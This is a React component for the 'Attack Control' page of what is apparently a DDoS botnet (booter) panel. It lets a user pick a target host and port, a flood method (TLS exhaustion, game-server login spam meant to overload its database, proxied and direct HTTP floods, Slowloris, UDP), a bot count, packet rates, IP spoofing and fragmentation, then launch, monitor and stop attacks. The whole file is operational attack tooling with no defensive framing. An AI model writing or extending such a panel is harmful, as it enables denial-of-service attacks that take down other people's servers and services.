import React, { useEffect, useState } from 'react';
import { api } from '../utils/api';
import { Crosshair, StopCircle, Zap, AlertTriangle, Clock, Target } from 'lucide-react';
import { useToast } from '../components/Toast';

interface Attack {
  id: string; target_host: string; target_port: number; method: string;
  duration_secs: number; pps_per_bot: number; spoof_mode: number;
  fragmentation: boolean; mega_mode: boolean; status: string;
  bot_ids: string[]; total_packets: number; started_at: string | null;
}

const METHODS = [
  { id: 'MEGA', desc: 'TCP flood + TLS — exhaust FDs + TLS resources' },
  { id: 'TLS_EXHAUST', desc: 'TCP flood + TLS (same as MEGA)' },
  { id: 'GAME', desc: 'NRO game socket — login spam + DB overload' },
  { id: 'HTTP_PROXY', desc: 'HTTP through proxy list (free IP rotation)' },
  { id: 'HTTP', desc: 'HTTP direct flood (keep-alive pool)' },
  { id: 'SLOWLORIS', desc: 'Slowloris (512 conns)' },
  { id: 'UDP', desc: 'UDP flood (bandwidth-heavy)' },
];

export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
  const { toast } = useToast();
  const [attacks, setAttacks] = useState<Attack[]>([]);
  const [form, setForm] = useState({
    target_host: '', target_port: 80, method: 'MEGA', duration_secs: 60,
    pps_per_bot: 100000, bot_count: 1, mega_mode: false,
    payload: '', proxies: '',
  });
  const [launching, setLaunching] = useState(false);
  const [err, setErr] = useState('');
  const [history, setHistory] = useState<Attack[]>([]);

  const fetchActive = async () => {
    try {
      const { data } = await api.get('/api/attacks/active');
      setAttacks(Array.isArray(data) ? data : data?.items || []);
    } catch { /* ignore poll errors */ }
  };

  const fetchHistory = async () => {
    try {
      const { data } = await api.get('/api/attacks/mine');
      setHistory(Array.isArray(data) ? data : data?.items || []);
    } catch { /* ignore */ }
  };

  useEffect(() => {
    fetchActive();
    fetchHistory();
    const i = setInterval(fetchActive, 3000);
    return () => clearInterval(i);
  }, []);

  const launch = async () => {
    if (!form.target_host.trim()) {
      setErr('Target host is required');
      return;
    }
    setLaunching(true);
    setErr('');
    try {
      const payload = {
        ...form,
        method: form.method,
        bot_count: form.bot_count,
        mega_mode: form.method === 'MEGA' || form.mega_mode,
        slowloris: form.method === 'SLOWLORIS',
        tls_exhaust: form.method === 'TLS_EXHAUST',
      };
      await api.post('/api/attacks/launch', payload);
      toast(`Attack launched → ${form.target_host}:${form.target_port}`, 'success');
      fetchActive();
    } catch (e: any) {
      const msg = e.response?.data?.detail || e.message || 'Launch failed';
      setErr(typeof msg === 'string' ? msg : JSON.stringify(msg));
      toast(typeof msg === 'string' ? msg : 'Launch failed', 'error');
    }
    setLaunching(false);
  };

  const stop = async (id: string) => {
    try {
      await api.post(`/api/attacks/${id}/stop`);
      toast('Attack stopped', 'success');
      fetchActive();
    } catch {
      toast('Failed to stop attack', 'error');
    }
  };

  const elapsed = (started: string | null, duration: number) => {
    if (!started) return '—';
    const sec = Math.floor((Date.now() - new Date(started).getTime()) / 1000);
    return `${Math.min(sec, duration)}s / ${duration}s`;
  };

  return (
    <div className="p-6 md:p-8 animate-fade-in max-w-6xl">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6">
        <div>
          <h2 className="text-2xl font-bold">Attack Control</h2>
          <p className="text-sm text-[var(--text-muted)] mt-1">Launch and manage active tasks</p>
        </div>
        <div className="text-xs text-[var(--text-muted)] px-3 py-1.5 rounded-full bg-[var(--bg-secondary)] border border-[var(--border)]">
          {attacks.length} active
        </div>
      </div>

      <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl p-5 md:p-6 mb-8">
        <h3 className="text-sm font-semibold mb-5 flex items-center gap-2">
          <Crosshair className="w-4 h-4 text-red-400" />Launch Attack
        </h3>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4 mb-4">
          <div className="sm:col-span-2">
            <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Target Host</label>
            <div className="relative">
              <Target className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[var(--text-muted)]" />
              <input
                placeholder="1.2.3.4 or host.example.com"
                className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl pl-9 pr-3 py-2.5 text-xs focus:outline-none focus:border-emerald-600 transition-colors font-mono"
                value={form.target_host}
                onChange={e => setForm(f => ({ ...f, target_host: e.target.value }))}
              />
            </div>
          </div>
          <div>
            <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Port</label>
            <input type="number" min={1} max={65535} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs font-mono" value={form.target_port} onChange={e => setForm(f => ({ ...f, target_port: parseInt(e.target.value) || 80 }))} />
          </div>
          <div>
            <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Duration (s)</label>
            <div className="relative">
              <Clock className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[var(--text-muted)]" />
              <input type="number" min={1} max={3600} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl pl-9 pr-3 py-2.5 text-xs" value={form.duration_secs} onChange={e => setForm(f => ({ ...f, duration_secs: parseInt(e.target.value) || 60 }))} />
            </div>
          </div>
          <div>
            <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Bot Count</label>
            <input type="number" min={1} max={100} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs font-mono" value={form.bot_count} onChange={e => setForm(f => ({ ...f, bot_count: parseInt(e.target.value) || 1 }))} />
          </div>
        </div>

        <div className="mb-4">
          <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-2">Method</label>
          <div className="flex flex-wrap gap-1.5">
            {METHODS.map(m => (
              <button
                key={m.id}
                type="button"
                onClick={() => setForm(f => ({ ...f, method: m.id, mega_mode: m.id === 'MEGA' }))}
                className={`px-3 py-1.5 rounded-lg text-[10px] font-medium transition-all border ${
                  form.method === m.id
                    ? 'bg-red-600/15 text-red-400 border-red-600/30'
                    : 'bg-[var(--bg-primary)] text-[var(--text-muted)] border-[var(--border)] hover:border-[var(--border-light)]'
                }`}
                title={m.desc}
              >
                {m.id}
              </button>
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-4">
          <div>
            <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">PPS / Bot</label>
            <input type="number" min={1000} max={100000000} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs font-mono" value={form.pps_per_bot} onChange={e => setForm(f => ({ ...f, pps_per_bot: parseInt(e.target.value) || 100000 }))} />
          </div>
          <div>
            <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Spoof</label>
            <select className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs text-[var(--text-primary)]" value={form.spoof_mode} onChange={e => setForm(f => ({ ...f, spoof_mode: parseInt(e.target.value) }))}>
              <option value={0}>Off</option>
              <option value={1}>VN IP</option>
              <option value={2}>Random</option>
            </select>
          </div>
          <div className="flex items-end gap-4 pb-2.5">
            <label className="flex items-center gap-2 text-xs text-[var(--text-secondary)] cursor-pointer">
              <input type="checkbox" checked={form.fragmentation} onChange={e => setForm(f => ({ ...f, fragmentation: e.target.checked }))} />
              Fragmentation
            </label>
            <label className="flex items-center gap-2 text-xs text-[var(--text-secondary)] cursor-pointer">
              <input type="checkbox" checked={form.mega_mode || form.method === 'MEGA'} onChange={e => setForm(f => ({ ...f, mega_mode: e.target.checked }))} />
              MEGA
            </label>
          </div>
          {form.method === 'GAME' && (
            <div>
              <label className="text-xs text-[var(--text-secondary)]">Game Payload (base64)</label>
              <textarea rows={2} placeholder="Paste base64-encoded game packet..." className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2 text-xs font-mono" value={form.payload} onChange={e => setForm(f => ({ ...f, payload: e.target.value }))} />
            </div>
          )}
          {form.method === 'HTTP_PROXY' && (
            <div>
              <label className="text-xs text-[var(--text-secondary)]">Proxy List (optional — auto-fetch if empty)</label>
              <textarea rows={2} placeholder="Leave empty for auto-fetch, or paste ip:port per line..." className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2 text-xs font-mono" value={form.proxies} onChange={e => setForm(f => ({ ...f, proxies: e.target.value }))} />
            </div>
          )}
          <div className="flex items-end">
            <button
              onClick={launch}
              disabled={launching || !form.target_host.trim()}
              className="w-full flex items-center justify-center gap-2 px-6 py-2.5 bg-red-600 hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed rounded-xl text-xs font-semibold transition-colors"
            >
              <Zap className="w-3.5 h-3.5" />
              {launching ? 'Launching…' : 'Launch'}
            </button>
          </div>
        </div>

        {err && (
          <div className="text-xs text-red-400 mt-2 flex items-center gap-1.5 p-3 rounded-xl bg-red-600/5 border border-red-600/15">
            <AlertTriangle className="w-3.5 h-3.5 flex-shrink-0" />{err}
          </div>
        )}
      </div>

      <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl overflow-hidden">
        <div className="p-4 border-b border-[var(--border)] flex items-center justify-between">
          <h3 className="text-sm font-semibold">Active Attacks</h3>
          <span className="text-xs text-[var(--text-muted)]">{attacks.length} running</span>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full min-w-[720px]">
            <thead>
              <tr className="border-b border-[var(--border)] text-left text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em]">
                <th className="p-4">Target</th>
                <th className="p-4">Method</th>
                <th className="p-4">Progress</th>
                <th className="p-4">PPS</th>
                <th className="p-4">Bots</th>
                <th className="p-4">Packets</th>
                <th className="p-4">Started</th>
                <th className="p-4">Action</th>
              </tr>
            </thead>
            <tbody>
              {attacks.length === 0 ? (
                <tr><td colSpan={8} className="p-12 text-center text-[var(--text-muted)]">No active attacks</td></tr>
              ) : attacks.map(a => (
                <tr key={a.id} className="border-b border-[var(--border)]/50 hover:bg-[var(--bg-hover)]/50">
                  <td className="p-4 text-xs font-mono">{a.target_host}:{a.target_port}</td>
                  <td className="p-4">
                    <span className="px-2 py-0.5 rounded text-[10px] font-medium bg-red-600/10 text-red-400 border border-red-600/20">{a.method}</span>
                  </td>
                  <td className="p-4 text-xs text-[var(--text-secondary)] tabular-nums">{elapsed(a.started_at, a.duration_secs)}</td>
                  <td className="p-4 text-xs text-[var(--text-secondary)] tabular-nums">{a.pps_per_bot?.toLocaleString()}</td>
                  <td className="p-4 text-xs text-[var(--text-secondary)]">{a.bot_ids?.length || 0}</td>
                  <td className="p-4 text-xs font-mono text-[var(--text-secondary)] tabular-nums">{(a.total_packets || 0).toLocaleString()}</td>
                  <td className="p-4 text-xs text-[var(--text-muted)]">{a.started_at ? new Date(a.started_at).toLocaleTimeString() : '—'}</td>
                  <td className="p-4">
                    <button onClick={() => stop(a.id)} className="p-2 hover:bg-red-600/10 rounded-lg text-red-400 transition-colors" title="Stop">
                      <StopCircle className="w-3.5 h-3.5" />
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Attack History */}
      <div className="mt-6 bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl overflow-hidden">
        <div className="px-6 py-4 border-b border-[var(--border)]">
          <h3 className="text-sm font-semibold flex items-center gap-2">
            <Clock className="w-4 h-4 text-[var(--text-muted)]" />
            Attack History
          </h3>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-[var(--bg-primary)]/50">
              <tr>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Target</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Method</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Status</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Packets</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Started</th>
              </tr>
            </thead>
            <tbody>
              {history.length === 0 ? (
                <tr><td colSpan={5} className="p-8 text-center text-[var(--text-muted)] text-xs">No attack history</td></tr>
              ) : history.slice(0, 20).map(a => (
                <tr key={a.id} className="border-b border-[var(--border)]/50">
                  <td className="p-4 text-xs font-mono">{a.target_host}:{a.target_port}</td>
                  <td className="p-4"><span className="px-2 py-0.5 rounded text-[10px] font-medium bg-[var(--bg-primary)] border border-[var(--border)] text-[var(--text-secondary)]">{a.method}</span></td>
                  <td className="p-4 text-xs">{a.status || '—'}</td>
                  <td className="p-4 text-xs font-mono text-[var(--text-secondary)]">{(a.total_packets || 0).toLocaleString()}</td>
                  <td className="p-4 text-xs text-[var(--text-muted)]">{a.started_at ? new Date(a.started_at).toLocaleString() : '—'}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
